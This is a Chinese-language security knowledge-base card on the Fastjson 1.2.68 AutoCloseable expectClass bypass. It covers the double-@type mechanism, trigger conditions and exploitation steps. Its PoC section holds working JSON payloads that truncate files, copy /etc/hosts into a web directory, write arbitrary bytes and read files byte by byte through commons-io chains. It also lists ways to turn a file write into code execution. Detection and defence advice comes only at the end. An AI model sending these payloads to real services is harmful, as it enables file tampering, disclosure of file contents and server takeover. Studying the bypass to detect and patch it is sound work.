---
id: web-java-deser-fastjson-1268-autocloseable-expectclass-file-rw
title: Fastjson 1.2.68 AutoCloseable 期望类绕过：双 @type 触发任意文件读写与目录创建
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-1268-autocloseable-expectclass
tags:
- java
- fastjson
- deserialization
- autotype
- autocloseable
- expectclass
- file-write
- file-read
- commons-io
cve: []
severity: critical
confidence: high
status: draft
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: fastjson 1.2.68（AutoCloseable 期望类绕过；后续版本将 AutoCloseable 加入 expectClass 黑名单）
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-1268-autocloseable-expectclass-file-rw/
draft: false
kb_aliases:
- fastjson 1.2.68 绕过
- AutoCloseable 期望类
- 双 @type 绕过
- fastjson 任意文件写
- fastjson commons-io 读写
- LockableFileWriter fastjson
- BOMInputStream fastjson
---

## 一句话结论

Fastjson 1.2.68 的 `JavaBeanDeserializer` 会把对象里第一个 `@type` 当作 `expectClass`，再用第二个 `@type` 去 `checkAutoType`；把第一个写成 `java.lang.AutoCloseable`、第二个写成任意实现 `AutoCloseable` 的 JDK/commons-io 类，就能在 AutoType 关闭时加载该类，并借其构造器/setter/close 副作用完成文件截断、写入、复制、读取和目录创建。

## 原理

1.2.68 的 `JavaBeanDeserializer.deserialize` 先取当前期望类型：

```java
Class<?> expectClass = TypeUtils.getClass(type);
userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
```

当 JSON 对象里出现两个 `@type` 时，第一个被解析成 `expectClass`，第二个才是 `typeName`。`checkAutoType` 中只要 `expectClass` 非空就置 `expectClassFlag=true`；如果 `typeName` 对应的类与 `expectClass` 兼容（`expectClass.isAssignableFrom(clazz)`），就允许加载，不需要 AutoType。

于是攻击者选 `java.lang.AutoCloseable` 作为期望类，再选一个实现 `Closeable`/`AutoCloseable`、且构造器或 setter 带文件操作副作用的类：

- `java.io.FileOutputStream(file, append)`：`append=false` 时打开即截断/创建文件；
- `java.io.FileWriter(file, append)`：同样可清空文件；
- `sun.rmi.server.MarshalOutputStream` + `java.util.zip.InflaterOutputStream` + `FileOutputStream`：构造/关闭时把解压后的字节写入文件；
- `org.eclipse.core.internal.localstore.SafeFileOutputStream(targetPath, tempPath)`：关闭时用临时文件覆盖目标，形成文件复制；
- commons-io 的 `BOMInputStream`/`ReaderInputStream`/`URLReader`/`TeeInputStream`/`WriterOutputStream`/`LockableFileWriter`：读取任意文件到错误/DNS/回显通道，或把可控字节写入任意路径并创建目录。

Fastjson 在实例化后按字段名调用 setter/构造参数，副作用在反序列化阶段就发生。

## 触发条件

- fastjson 1.2.68（该 expectClass 逻辑所在版本），SafeMode 关闭；
- 不可信 JSON 进入 `JSON.parse`/`parseObject`；
- classpath 存在目标 JDK 类或对应 commons-io 版本；
- 攻击者知道可写路径；读取链需要回显、报错或 DNS 通道；
- 目标进程对目标路径有相应权限。

## 利用步骤

1. 确认 fastjson 版本为 1.2.68 且 `@type` 生效；
2. 选择链：文件截断用 `FileOutputStream`/`FileWriter`；写文件用 `MarshalOutputStream`/commons-io；读文件用 `BOMInputStream + URLReader`；复制用 `SafeFileOutputStream`；
3. 在同一个对象里写两个 `@type`：第一个 `java.lang.AutoCloseable`，第二个目标类；
4. 按目标类字段名填参数（commons-io 2.2–2.4 用 `s`，2.5+ 用 `cs`；`XmlStreamReader` 2.2–2.6 用 `is`，2.7+ 用 `inputStream`）；
5. 观察文件变化或通过报错/DNS/回显读取内容；
6. 若目标带期望类（`parseObject(json, Xxx.class)`），再用 `java.util.Currency` 包装触发 getter（见关联卡）。

## PoC

文件截断（JDK 自带，最短验证）：

```json
{"@type":"java.lang.AutoCloseable","@type":"java.io.FileOutputStream","file":"/tmp/123","append":false}
```

```json
{"@type":"java.lang.AutoCloseable","@type":"java.io.FileWriter","file":"/tmp/nonexist","append":"false"}
```

文件复制（需 aspectjtools）：

```json
{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream",
  "targetPath":"/app/web/nonexist.txt",
  "tempPath":"/etc/hosts"
}
```

任意写（JDK11，经 `MarshalOutputStream` + `InflaterOutputStream` + `FileOutputStream`）：

```json
{
  "@type":"java.lang.AutoCloseable",
  "@type":"sun.rmi.server.MarshalOutputStream",
  "out":{
    "@type":"java.util.zip.InflaterOutputStream",
    "out":{"@type":"java.io.FileOutputStream","file":"/tmp/out","append":false},
    "infl":{"input":{"array":[<deflated bytes>],"limit":<len>}},
    "bufLen":"100"
  },
  "protocolVersion":1
}
```

commons-io 读文件（逐字节，靠报错/响应差异判断）：

```json
{
  "abc":{
    "@type":"java.lang.AutoCloseable",
    "@type":"org.apache.commons.io.input.BOMInputStream",
    "delegate":{
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///tmp/test"},
      "charsetName":"UTF-8","bufferSize":1024
    },
    "boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[<guess>]}]
  },
  "address":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String"{"$ref":"$.abc.BOM[0]"},"start":0,"end":0}}
}
```

commons-io 写文件（ioFinal 结构，`LockableFileWriter` 支持任意长度并可用 `lockDir` 建目录）：

```json
{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.BOMInputStream",
  "delegate":{
    "@type":"java.lang.AutoCloseable",
    "@type":"org.apache.commons.io.input.AutoCloseInputStream",
    "in":{
      "@type":"org.apache.commons.io.input.TeeInputStream",
      "input":{
        "@type":"org.apache.commons.io.input.ReaderInputStream",
        "reader":{
          "@type":"org.apache.commons.io.input.CharSequenceReader",
          "charSequence":{"@type":"java.lang.String""<iso-8859-1 bytes>"},
          "encoder":"iso-8859-1",
          "charset":"iso-8859-1",
          "bufferSize":1
        },
        "branch":{
          "@type":"org.apache.commons.io.output.WriterOutputStream",
          "writer":{
            "@type":"org.apache.commons.io.output.LockableFileWriter",
            "file":"/tmp/pwn",
            "charset":"iso-8859-1",
            "lockDir":"/tmp/dir",
            "append":false
          },
          "charset":"iso-8859-1",
          "bufferSize":1024,
          "writeImmediately":true
        },
        "closeBranch":true
      }
    }
  },
  "include":true,
  "boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"iso-8859-1","bytes":[0,0,0]}],
  "x":{"$ref":"$.bOM"}
}
```

## 变体与关联

- 读文件通道：错误回显（正确时无报错）、DNS（内容不对时发起 DNS）、HTTP（把内容带到 URL）；也可靠响应差异逐字节猜解。
- 写文件：`FileOutputStream`/`FileWriter` 只能截断/写小内容；`MarshalOutputStream` 可写解压内容；commons-io io1–io6 各受 8KB、依赖、版本参数名限制，ioFinal 用 `LockableFileWriter` 突破 8KB 并建目录。
- 组件版本：commons-io 2.2–2.4 `CharSequenceInputStream.s`，2.5+ `cs`；`XmlStreamReader` 2.2–2.6 `is`，2.7+ `inputStream`。
- 关联：[[web-java-deser-fastjson-currency-getter-expected-class]]（有期望类时触发 getter）；1.2.80 用 `Exception` 与反序列化器缓存继续绕过；写文件转 RCE 依赖 cron/sshkey/JSP/JRE classes/SPI/tomcat-docbase 等落地点。

## 检测与防御

- 检测：JSON 中出现两个 `@type`，第一个为 `java.lang.AutoCloseable`；出现 `FileOutputStream`、`FileWriter`、`MarshalOutputStream`、`InflaterOutputStream`、`SafeFileOutputStream`、`BOMInputStream`、`LockableFileWriter`、`ReaderInputStream` 等类名；应用进程异常写临时目录/Web 目录。
- 防御：升级 fastjson（AutoCloseable 已被加入 expectClass 黑名单）；开启 SafeMode；对 `@type` 做严格白名单；禁止不可信 JSON 直接反序列化；限制 Web 进程对敏感目录的写权限。
- 注意：仅关闭 AutoType 不能防住期望类绕过；需同时限制 `@type` 类型集合。
